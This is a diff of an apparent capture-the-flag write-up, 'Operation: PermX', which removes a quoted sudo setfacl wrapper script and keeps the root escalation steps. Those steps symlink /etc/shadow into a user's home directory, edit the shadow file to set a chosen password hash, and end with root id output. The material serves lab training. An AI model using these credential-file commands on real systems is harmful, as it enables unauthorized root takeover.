@@ -1,7 +1,7 @@
 #######################################################################
 #                             OPERATION: PERMX                        #
 #                        STATE-SPONSORED ATTACK                       #
-#                               WALKOUT                               #
+#                                WRITEUP!                             #
 #######################################################################
 
 ==============================[ NETWORK SCAN ]===============================
@@ -153,30 +153,6 @@ ESCALATE LINUX PRIVILEGE
 
 PROGRAM IS chmod privilege for files without root.
 
-#!/bin/bash
-
-if [ "$#" -ne 3 ]; then
-    /usr/bin/echo "Usage: $0 user perm file"
-    exit 1
-fi
-
-user="$1"
-perm="$2"
-target="$3"
-
-if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
-    /usr/bin/echo "Access denied."
-    exit 1
-fi
-
-# Check if the path is a file
-if [ ! -f "$target" ]; then
-    /usr/bin/echo "Target must be a file."
-    exit 1
-fi
-
-/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
-
 # SO WE CAN DO ln -s FOR SHADOW FILE!
 
 ln -s /etc/shadow shadow
@@ -186,8 +162,8 @@ vim /etc/shadow
 # SO DO HASH WHAT WE WANT
 # AND permit with root!
 
-################################
+####################################################
 uid=0(root) gid=0(root) groups=0(root)
 
-#############################################
-                 GAME OVER!
+####################################################
+GAME OVER!
